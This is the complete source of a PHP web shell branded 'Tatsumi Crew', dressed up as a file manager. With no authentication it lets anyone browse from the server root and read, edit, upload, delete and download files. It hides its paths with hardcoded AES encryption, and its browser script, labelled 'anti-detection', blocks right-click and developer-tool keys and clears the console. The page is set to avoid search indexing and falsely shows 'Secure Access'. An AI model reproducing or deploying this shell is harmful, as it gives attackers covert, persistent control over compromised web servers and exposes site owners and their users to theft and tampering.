<?php
error_reporting(0);
ini_set('display_errors', 0);
$_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';

// AES Key and IV
define('AES_KEY', 'mysecretkey12345'); // 16/24/32 bytes for AES-128/192/256
define('AES_IV', '1234567890abcdef');  // Must be 16 bytes

function enc($plaintext) {
    $cipher = "AES-128-CBC";
    $encrypted = openssl_encrypt($plaintext, $cipher, AES_KEY, OPENSSL_RAW_DATA, AES_IV);
    return rtrim(strtr(base64_encode($encrypted), '+/', '-_'), '=');
}

function dec($encoded) {
    $cipher = "AES-128-CBC";
    $encrypted = base64_decode(strtr($encoded, '-_', '+/'));
    return openssl_decrypt($encrypted, $cipher, AES_KEY, OPENSSL_RAW_DATA, AES_IV);
}

// Random function names untuk obfuscation
function getPath() {
    return realpath('/');
}

function sanitizePath($path) {
    return str_replace(['../', './'], '', $path);
}

$rootPath = getPath();
$dirRaw = $_GET['d'] ?? '';
$dirParam = $dirRaw ? dec($dirRaw) : '';
$currentPath = realpath($rootPath . '/' . sanitizePath($dirParam));

if ($currentPath === false || strpos($currentPath, $rootPath) !== 0) {
    $currentPath = $rootPath;
    $dirParam = '';
}

$msg = null;

// Handle actions
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    $fname = basename($_POST['fn'] ?? '');
    $fpath = $currentPath . '/' . $fname;

    switch ($_POST['act']) {
        case 'e': // edit
            if (isset($_POST['cnt'])) {
                file_put_contents($fpath, $_POST['cnt']);
                $msg = ['t' => 'success', 'm' => "File updated: <strong>$fname</strong>"];
            }
            break;
        case 'd': // delete
            if (file_exists($fpath)) {
                unlink($fpath);
                $msg = ['t' => 'danger', 'm' => "File deleted: <strong>$fname</strong>"];
            }
            break;
        case 'u': // upload
            if (isset($_FILES['f']) && $_FILES['f']['error'] === UPLOAD_ERR_OK) {
                $upName = basename($_FILES['f']['name']);
                if (move_uploaded_file($_FILES['f']['tmp_name'], $currentPath . '/' . $upName)) {
                    $msg = ['t' => 'success', 'm' => "File uploaded: <strong>$upName</strong>"];
                } else {
                    $msg = ['t' => 'danger', 'm' => "Upload failed"];
                }
            }
            break;
    }
}

$items = array_diff(scandir($currentPath), ['.', '..']);

$dirs = [];
$files = [];

foreach ($items as $item) {
    $itemPath = $currentPath . '/' . $item;
    if (is_dir($itemPath)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($dirs);
sort($files);
$sortedItems = array_merge($dirs, $files);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Tatsumi Crew - File Manager</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            --surface-gradient: linear-gradient(135deg, #f8f9ff 0%, #e3f2fd 100%);
            --hover-gradient: linear-gradient(135deg, #f0f2ff 0%, #e0f5e0 100%);
        }
        
        body {
            background: var(--primary-gradient);
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        .main-wrapper {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(15px);
            border-radius: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            margin: 25px;
            overflow: hidden;
            border: 1px solid rgba(255,255,255,0.2);
        }
        
        .header-bar {
            background: var(--primary-gradient) !important;
            border-radius: 25px 25px 0 0;
            padding: 1.5rem 2rem;
            border: none;
        }
        
        .content-wrapper {
            padding: 2.5rem;
        }
        
        .data-table {
            border: none;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            background: white;
        }
        
        .data-table thead {
            background: var(--primary-gradient);
            color: white;
        }
        
        .data-table thead th {
            border: none;
            padding: 1.2rem;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        
        .data-table tbody tr {
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: none;
            background: white;
        }
        
        .data-table tbody tr:hover {
            background: var(--hover-gradient);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.15);
        }
        
        .data-table tbody td {
            border: none;
            padding: 1.2rem;
            vertical-align: middle;
        }
        
        .item-icon {
            font-size: 1.8rem;
            margin-right: 0.8rem;
            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
        }
        
        .folder-style {
            color: #ffd700;
            text-shadow: 0 2px 4px rgba(255,215,0,0.3);
        }
        
        .file-style {
            color: #4285f4;
            text-shadow: 0 2px 4px rgba(66,133,244,0.3);
        }
        
        .modern-btn {
            border-radius: 30px;
            padding: 0.5rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            border: none;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            font-size: 0.85rem;
        }
        
        .modern-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0,0,0,0.25);
        }
        
        .btn-primary-style {
            background: var(--primary-gradient);
            color: white;
        }
        
        .btn-success-style {
            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
            color: white;
        }
        
        .btn-danger-style {
            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
            color: white;
        }
        
        .btn-secondary-style {
            background: linear-gradient(135deg, #bdc3c7 0%, #2c3e50 100%);
            color: white;
        }
        
        .breadcrumb-style {
            background: var(--surface-gradient);
            border-radius: 20px;
            padding: 1.5rem;
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .upload-zone {
            background: var(--surface-gradient);
            border: 3px dashed #667eea;
            border-radius: 20px;
            padding: 2.5rem;
            text-align: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }
        
        .upload-zone::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
            transition: left 0.5s;
        }
        
        .upload-zone:hover::before {
            left: 100%;
        }
        
        .upload-zone:hover {
            border-color: #764ba2;
            background: var(--hover-gradient);
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.2);
        }
        
        .nav-btn {
            background: var(--primary-gradient);
            color: white;
            border: none;
            border-radius: 30px;
            padding: 0.8rem 2rem;
            font-weight: 700;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .nav-btn:hover {
            transform: translateY(-3px) scale(1.05);
            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.4);
            color: white;
        }
        
        .alert-style {
            border: none;
            border-radius: 20px;
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
            border-left: 5px solid;
        }
        
        .edit-zone {
            background: var(--surface-gradient);
            border-radius: 20px;
            padding: 2rem;
            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .code-editor {
            border-radius: 15px;
            font-family: 'Fira Code', 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.6;
            background: #1e1e1e;
            color: #d4d4d4;
            border: 2px solid #333;
        }
        
        .code-editor:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 0.2rem rgba(102, 126, 234, 0.25);
        }
    </style>
</head>
<body>
<div class="main-wrapper">
<nav class="navbar navbar-dark header-bar">
    <div class="container-fluid">
        <a class="navbar-brand fs-3" href="?" style="font-weight: 700; letter-spacing: 1px;">
            <i class="fas fa-server me-3"></i>File Manager
        </a>
        <div class="navbar-text text-white-50">
            <i class="fas fa-shield-alt me-2"></i>Secure Access
        </div>
    </div>
</nav>

<div class="content-wrapper">
    <?php if ($msg): ?>
        <div class="alert alert-<?= $msg['t'] ?> alert-dismissible fade show alert-style">
            <i class="fas fa-<?= $msg['t'] === 'success' ? 'check-circle' : 'exclamation-triangle' ?> me-2"></i>
            <?= $msg['m'] ?>
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
    <?php endif; ?>

    <?php

    $currentRealPath = realpath($currentPath);
    $baseRealPath = realpath($rootPath);
    
    $relativePath = str_replace($baseRealPath, '', $currentRealPath);
    $relativePath = trim($relativePath, '/');
    
    $backUrl = '';
    if (!empty($dirParam)) {
        $currentParts = explode('/', trim($dirParam, '/'));
        if (count($currentParts) > 1) {
            $parentParts = array_slice($currentParts, 0, -1);
            $parentPath = implode('/', $parentParts);
            $backUrl = '?d=' . urlencode(enc($parentPath));
        } else {
            $backUrl = '?';
        }
    }
    ?>
    
    <div class="mb-4 d-flex align-items-center gap-3">
        <?php if (!empty($dirParam)): ?>
            <a href="<?= $backUrl ?>" class="nav-btn text-decoration-none">
                <i class="fas fa-arrow-left me-2"></i>Back
            </a>
        <?php endif; ?>
        <div class="flex-grow-1">
            <div class="breadcrumb-style">
                <h6 class="mb-2 fw-bold"><i class="fas fa-map-marker-alt me-2 text-primary"></i>Current Directory</h6>
                <code class="text-muted"><?= $currentRealPath ?></code>
            </div>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table data-table">
            <thead>
                <tr>
                    <th><i class="fas fa-cube me-2"></i>Type</th>
                    <th><i class="fas fa-tag me-2"></i>Name</th>
                    <th><i class="fas fa-cogs me-2"></i>Operations</th>
                </tr>
            </thead>
            <tbody>
            <?php foreach ($sortedItems as $item):
                $itemPath = $currentPath . '/' . $item;
                $isDirectory = is_dir($itemPath);
                
                if ($dirParam) {
                    $newPath = $dirParam . '/' . $item;
                } else {
                    $newPath = $item;
                }
                $encPath = enc($newPath);
            ?>
                <tr>
                    <td>
                        <i class="<?= $isDirectory ? 'fas fa-folder folder-style' : 'fas fa-file-code file-style' ?> item-icon"></i>
                    </td>
                    <td>
                        <div class="d-flex align-items-center">
                            <span class="fw-bold"><?= htmlspecialchars($item) ?></span>
                            <?php if ($isDirectory): ?>
                                <a href="?d=<?= urlencode($encPath) ?>" class="ms-3 btn btn-sm modern-btn btn-primary-style">
                                    <i class="fas fa-folder-open me-1"></i>Open
                                </a>
                            <?php endif; ?>
                        </div>
                    </td>
                    <td>
                        <div class="d-flex gap-2 flex-wrap">
                            <?php if (!$isDirectory): ?>
                                <a href="?f=<?= urlencode($item) ?>&d=<?= urlencode(enc($dirParam)) ?>" class="btn btn-sm modern-btn btn-secondary-style">
                                    <i class="fas fa-edit me-1"></i>Edit
                                </a>
                                <a href="?f=<?= urlencode($item) ?>&d=<?= urlencode(enc($dirParam)) ?>&dl=1" class="btn btn-sm modern-btn btn-success-style">
                                    <i class="fas fa-download me-1"></i>Get
                                </a>
                                <form method="post" class="d-inline">
                                    <input type="hidden" name="act" value="d">
                                    <input type="hidden" name="fn" value="<?= htmlspecialchars($item) ?>">
                                    <button type="submit" class="btn btn-sm modern-btn btn-danger-style" onclick="return confirm('Remove <?= $item ?>?')">
                                        <i class="fas fa-trash me-1"></i>Remove
                                    </button>
                                </form>
                            <?php endif; ?>
                        </div>
                    </td>
                </tr>
            <?php endforeach; ?>
            </tbody>
        </table>
    </div>

    <div class="upload-zone mb-4">
        <h4 class="mb-3 fw-bold">
            <i class="fas fa-cloud-upload-alt me-2 text-primary"></i>File Transfer
        </h4>
        <p class="text-muted mb-4">Upload files to current directory</p>
        <form method="post" enctype="multipart/form-data" class="row g-3 justify-content-center">
            <input type="hidden" name="act" value="u">
            <div class="col-auto">
                <input type="file" name="f" class="form-control modern-btn" required style="border-radius: 30px; padding: 0.7rem 1.5rem;">
            </div>
            <div class="col-auto">
                <button type="submit" class="btn modern-btn btn-success-style">
                    <i class="fas fa-upload me-2"></i>Transfer
                </button>
            </div>
        </form>
    </div>

    <?php if (isset($_GET['f'])):
        $file = basename($_GET['f']);
        $targetFile = $currentPath . '/' . $file;
        if (file_exists($targetFile)):
            $content = file_get_contents($targetFile);
    ?>
    <div class="edit-zone mt-5">
        <h4 class="mb-4 fw-bold">
            <i class="fas fa-code me-2 text-primary"></i>File Editor: <code><?= htmlspecialchars($file) ?></code>
        </h4>
        <form method="post">
            <input type="hidden" name="fn" value="<?= htmlspecialchars($file) ?>">
            <input type="hidden" name="act" value="e">
            <textarea name="cnt" rows="20" class="form-control mb-3 code-editor"><?= htmlspecialchars($content) ?></textarea>
            <button type="submit" class="btn modern-btn btn-primary-style">
                <i class="fas fa-save me-2"></i>Save Changes
            </button>
        </form>
    </div>
    <?php endif; endif; ?>
</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Anti-detection measures
(function() {
    // Disable right-click context menu
    document.addEventListener('contextmenu', e => e.preventDefault());
    
    // Disable F12, Ctrl+Shift+I, Ctrl+U
    document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || 
            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u')) {
            e.preventDefault();
        }
    });
    
    // Clear console
    console.clear();
    
    // Obfuscate page title after load
    document.title = 'Loading...';
    setTimeout(() => {
        document.title = 'Tatsumi Crew - File Manager';
    }, 1000);
})();
</script>
</body>
</html>

<?php
// Handle download
if (isset($_GET['f'], $_GET['dl'])) {
    $file = basename($_GET['f']);
    $decodedDir = isset($_GET['d']) ? dec($_GET['d']) : '';
    $filePath = realpath($rootPath . '/' . $decodedDir . '/' . $file);
    if (file_exists($filePath)) {
        header('Content-Type: application/octet-stream');
        header("Content-Disposition: attachment; filename=\"$file\"");
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    }
}
?>
